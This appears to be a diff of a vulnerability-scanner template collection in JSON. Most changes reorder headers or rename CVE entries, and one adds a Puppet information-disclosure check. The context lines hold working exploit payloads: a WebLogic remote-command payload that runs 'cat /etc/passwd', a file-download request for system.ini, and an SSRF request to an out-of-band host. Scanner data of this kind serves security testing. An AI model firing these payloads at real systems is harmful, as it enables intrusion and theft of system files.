@@ -9710,8 +9710,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Test-Header": "cat /etc/passwd",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Test-Header": "cat /etc/passwd"
           },
           "method": "POST",
           "path": [
@@ -10591,9 +10591,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -11581,6 +11581,21 @@
         {
           "raw": [
             "GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-7943",
+      "info": {
+        "name": "Puppet Server and PuppetDB sensitive information disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/metrics/v1/mbeans"
           ]
         }
       ]
@@ -15924,7 +15939,7 @@
     {
       "id": "CVE-2022-21371",
       "info": {
-        "name": "Oracle WebLogic Server LFI",
+        "name": "Oracle WebLogic Server Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -15939,7 +15954,7 @@
     {
       "id": "CVE-2022-22536",
       "info": {
-        "name": "SAP Memory Pipes(MPI) Desynchronization",
+        "name": "SAP Memory Pipes (MPI) Desynchronization",
         "severity": "critical"
       },
       "requests": [
@@ -15988,7 +16003,7 @@
     {
       "id": "CVE-2022-23134",
       "info": {
-        "name": "Zabbix Setup Configuration - Unauthenticated Access",
+        "name": "Zabbix Setup Configuration Authentication Bypass",
         "severity": "medium"
       },
       "requests": [
@@ -16053,7 +16068,7 @@
     {
       "id": "CVE-2022-23944",
       "info": {
-        "name": "ShenYu Admin Unauth Access",
+        "name": "Apache ShenYu Admin Unauth Access",
         "severity": "medium"
       },
       "requests": [
@@ -16068,7 +16083,7 @@
     {
       "id": "CVE-2022-24112",
       "info": {
-        "name": "Apache APISIX apisix/batch-requests RCE",
+        "name": "Apache APISIX apisix/batch-requests Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -16083,7 +16098,7 @@
     {
       "id": "CVE-2022-24124",
       "info": {
-        "name": "Casdoor 1.13.0 - SQL Injection (Unauthenticated)",
+        "name": "Casdoor 1.13.0 - Unauthenticated SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -16098,7 +16113,7 @@
     {
       "id": "CVE-2022-24260",
       "info": {
-        "name": "VoipMonitor - Pre-Auth SQL injection",
+        "name": "VoipMonitor - Pre-Auth SQL Injection",
         "severity": "critical"
       },
       "requests": [
